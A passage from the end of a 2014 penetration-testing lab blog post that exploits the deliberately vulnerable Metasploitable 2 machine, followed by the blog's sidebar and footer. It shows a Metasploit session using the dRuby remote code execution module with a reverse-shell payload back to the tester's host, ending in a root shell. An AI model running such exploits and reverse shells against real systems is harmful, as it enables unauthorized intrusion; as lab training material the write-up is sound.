</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/misc/drb_remote_codeexec
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/linux/misc/drb_remote_codeexec):
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>   URI                    yes       The dRuby URI of the target host (druby://host:port)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; set URI druby://192.168.127.154:8787
</span><span class='line'>URI =&gt; druby://192.168.127.154:8787
</span><span class='line'>
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; set payload cmd/unix/reverse
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] trying to exploit instance_eval
</span><span class='line'>[*] instance eval failed, trying to exploit syscall
</span><span class='line'>[-] Exploit failed: Errno::EINVAL Invalid argument
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo 7Kx3j4QvoI7LOU5z;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "7Kx3j4QvoI7LOU5z\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.154:35889) at 2014-06-08 16:51:56 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Another port, another shell!</p>

<p>This turned out to be a a very lengthy post. There were some ports I couldn&rsquo;t find an exploit for, so can&rsquo;t determine if the underlying services were exploitable or not. Overall, owning Metasploitable in multiple ways and documenting it was the goal of this post.</p>

<p>Today&rsquo;s cookie:</p>

<blockquote><p>You will be a winner today.  Pick a fight with a four-year-old.</p></blockquote>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>

      








  


<time datetime="2014-06-03T14:16:09-04:00" pubdate data-updated="true">Jun 3<span>rd</span>, 2014</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2014/05/30/network-tools-netcat/" title="Previous Post: Network tools - Netcat">&laquo; Network tools - Netcat</a>
      
      
        <a class="basic-alignment right" href="/blog/2014/06/09/getting-pure-ftpd-up-and-running/" title="Next Post: Getting Pure-FTPd up and running">Getting Pure-FTPd up and running &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>whoami</h1>
  <p>switch (interests){<br>
 case INFORMATION SECURITY:<br>
Mostly offensive security, but trying to be well-rounded in everything;<br>
case PYTHON:<br>
Mainly security and sysadmin related scripting;<br>
case LINUX:<br>
Greetings from /dev/null;<br>
case JAPANESE:<br>
Language, anime, samurai;<br>
case MARTIAL ARTS:<br>
If it's fighting I like it;<br>
case MILITARY SCIENCE:<br>
Ancient, medieval, modern;<br>
default: GAMING;}</p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2018/02/08/lfcs-prep-runlevels-and-bootloader-configuration/">LFCS prep - Runlevels and bootloader configuration</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/02/02/lfcs-prep-using-firewalld/">LFCS prep - Using firewalld</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/01/30/lfcs-prep-autofs-automounter/">LFCS prep - autofs automounter</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/01/27/lfcs-prep-lvm-storage-management/">LFCS prep - LVM storage management</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/01/17/lfcs-prep-creating-custom-yum-repositories/">LFCS prep - Creating custom yum repositories</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'chousensha',
            count: 5,
            skip_forks: true,
	    skip_repos: [ "chousensha.github.io" ],
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
  </ul>
  
    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
  
</section>

<section>
  <h1>Blogroll</h1>
  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2018 - chousensha -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'coredumpoverflow';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2/';
        var disqus_url = 'http://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
